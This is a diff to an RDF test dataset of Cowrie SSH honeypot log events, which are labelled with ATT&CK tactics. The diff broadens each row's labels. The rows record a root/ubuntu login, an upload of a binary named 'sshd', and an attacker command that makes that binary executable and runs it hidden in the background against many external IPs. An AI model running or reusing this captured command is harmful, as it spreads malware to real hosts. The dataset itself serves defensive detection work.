@@ -32,7 +32,7 @@
 :test-10 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"dst_ip\": \"10.42.6.15\", \"dst_port\": 2222.0, \"eventid\": \"cowrie.session.connect\", \"message\": \"New connection: 10.42.6.1:8906 (10.42.6.15:2222) [session: be1939f18ace]\", \"protocol\": \"ssh\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"src_port\": 8906.0, \"timestamp\": \"2025-08-04T23:53:22.641240Z\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-10;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"eventid": "cowrie.client.version", "message": "Remote SSH version: SSH-2.0-Go", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:53:22.689957Z", "version": "SSH-2.0-Go", "session_id": "be1939f18ace"}
 
@@ -46,7 +46,7 @@
 :test-11 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"eventid\": \"cowrie.client.version\", \"message\": \"Remote SSH version: SSH-2.0-Go\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:53:22.689957Z\", \"version\": \"SSH-2.0-Go\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-11;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"compCS": ["none"], "encCS": ["aes128-gcm@openssh.com", "chacha20-poly1305@openssh.com", "aes128-ctr", "aes192-ctr", "aes256-ctr"], "eventid": "cowrie.client.kex", "hash": "98ddc5604ef6a1006a2b49a58759fbe6", "hashAlgorithms": "curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none", "kexAlgs": ["curve25519-sha256@libssh.org", "ecdh-sha2-nistp256", "ecdh-sha2-nistp384", "ecdh-sha2-nistp521", "diffie-hellman-group14-sha1"], "keyAlgs": ["rsa-sha2-512-cert-v01@openssh.com", "rsa-sha2-256-cert-v01@openssh.com", "ssh-rsa-cert-v01@openssh.com", "ssh-dss-cert-v01@openssh.com", "ecdsa-sha2-nistp256-cert-v01@openssh.com", "ecdsa-sha2-nistp384-cert-v01@openssh.com", "ecdsa-sha2-nistp521-cert-v01@openssh.com", "ssh-ed25519-cert-v01@openssh.com", "ecdsa-sha2-nistp256", "ecdsa-sha2-nistp384", "ecdsa-sha2-nistp521", "rsa-sha2-512", "rsa-sha2-256", "ssh-rsa", "ssh-dss", "ssh-ed25519"], "langCS": [""], "macCS": ["hmac-sha2-256-etm@openssh.com", "hmac-sha2-256", "hmac-sha1", "hmac-sha1-96"], "message": "SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:53:22.716126Z", "session_id": "be1939f18ace"}
 
@@ -60,7 +60,7 @@
 :test-12 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"compCS\": [\"none\"], \"encCS\": [\"aes128-gcm@openssh.com\", \"chacha20-poly1305@openssh.com\", \"aes128-ctr\", \"aes192-ctr\", \"aes256-ctr\"], \"eventid\": \"cowrie.client.kex\", \"hash\": \"98ddc5604ef6a1006a2b49a58759fbe6\", \"hashAlgorithms\": \"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none\", \"kexAlgs\": [\"curve25519-sha256@libssh.org\", \"ecdh-sha2-nistp256\", \"ecdh-sha2-nistp384\", \"ecdh-sha2-nistp521\", \"diffie-hellman-group14-sha1\"], \"keyAlgs\": [\"rsa-sha2-512-cert-v01@openssh.com\", \"rsa-sha2-256-cert-v01@openssh.com\", \"ssh-rsa-cert-v01@openssh.com\", \"ssh-dss-cert-v01@openssh.com\", \"ecdsa-sha2-nistp256-cert-v01@openssh.com\", \"ecdsa-sha2-nistp384-cert-v01@openssh.com\", \"ecdsa-sha2-nistp521-cert-v01@openssh.com\", \"ssh-ed25519-cert-v01@openssh.com\", \"ecdsa-sha2-nistp256\", \"ecdsa-sha2-nistp384\", \"ecdsa-sha2-nistp521\", \"rsa-sha2-512\", \"rsa-sha2-256\", \"ssh-rsa\", \"ssh-dss\", \"ssh-ed25519\"], \"langCS\": [\"\"], \"macCS\": [\"hmac-sha2-256-etm@openssh.com\", \"hmac-sha2-256\", \"hmac-sha1\", \"hmac-sha1-96\"], \"message\": \"SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:53:22.716126Z\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-12;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"eventid": "cowrie.login.success", "message": "login attempt [root/ubuntu] succeeded", "password": "ubuntu", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:53:22.800616Z", "username": "root", "session_id": "be1939f18ace"}
 
@@ -74,7 +74,7 @@
 :test-13 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"eventid\": \"cowrie.login.success\", \"message\": \"login attempt [root/ubuntu] succeeded\", \"password\": \"ubuntu\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:53:22.800616Z\", \"username\": \"root\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-13;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"eventid": "cowrie.session.file_upload", "filename": "sshd", "message": "SFTP Uploaded file \"sshd\" to var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00", "outfile": "var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "shasum": "94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:54:15.429171Z", "session_id": "be1939f18ace"}
 
@@ -88,7 +88,7 @@
 :test-14 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"eventid\": \"cowrie.session.file_upload\", \"filename\": \"sshd\", \"message\": \"SFTP Uploaded file \\\"sshd\\\" to var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00\", \"outfile\": \"var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"shasum\": \"94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:54:15.429171Z\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-14;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"arch": "linux-x64-lsb", "eventid": "cowrie.session.params", "message": "[]", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:54:15.722391Z", "session_id": "be1939f18ace"}
 
@@ -102,7 +102,7 @@
 :test-15 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"arch\": \"linux-x64-lsb\", \"eventid\": \"cowrie.session.params\", \"message\": \"[]\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:54:15.722391Z\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-15;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"eventid": "cowrie.command.input", "input": "chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &", "message": "CMD: chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:54:15.723075Z", "session_id": "be1939f18ace"}
 
@@ -116,7 +116,7 @@
 :test-16 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"eventid\": \"cowrie.command.input\", \"input\": \"chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &\", \"message\": \"CMD: chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:54:15.723075Z\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-16;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"duplicate": false, "duration": "0.0", "eventid": "cowrie.log.closed", "message": "Closing TTY Log: var/lib/cowrie/tty/9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711 after 0.0 seconds", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "shasum": "9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711", "size": 136.0, "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:54:15.751194Z", "ttylog": "var/lib/cowrie/tty/9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711", "session_id": "be1939f18ace"}
 
@@ -130,7 +130,7 @@
 :test-17 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"duplicate\": false, \"duration\": \"0.0\", \"eventid\": \"cowrie.log.closed\", \"message\": \"Closing TTY Log: var/lib/cowrie/tty/9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711 after 0.0 seconds\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"shasum\": \"9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711\", \"size\": 136.0, \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:54:15.751194Z\", \"ttylog\": \"var/lib/cowrie/tty/9578b8a9034e95a84aea2f9561ec64fa30c1ab97b5f5abcb9007e65522f1f711\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-17;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 # {"duration": "53.1", "eventid": "cowrie.session.closed", "message": "Connection lost after 53.1 seconds", "sensor": "cowrie-poli-worker-01-89bfdd5dd-v7wvn", "src_ip": "10.42.6.1", "timestamp": "2025-08-04T23:54:15.752099Z", "session_id": "be1939f18ace"}
 
@@ -144,7 +144,7 @@
 :test-18 rdf:type mlsx:DatasetRow;
   mlsx:eventMessage "{\"duration\": \"53.1\", \"eventid\": \"cowrie.session.closed\", \"message\": \"Connection lost after 53.1 seconds\", \"sensor\": \"cowrie-poli-worker-01-89bfdd5dd-v7wvn\", \"src_ip\": \"10.42.6.1\", \"timestamp\": \"2025-08-04T23:54:15.752099Z\", \"session_id\": \"be1939f18ace\"}";
   mlsx:hasLabel :event-18;
-  mlsx:hasTactic "Execution", "Initial Access".
+  mlsx:hasTactic "Initial Access", "Execution" , "Persistence", "Command and Control".
 
 :test-dataset rdf:type mlsx:TestDataset;
   mlsx:hasPart :test-10, :test-11, :test-12, :test-13, :test-14, :test-15, :test-16, :test-17, :test-18.
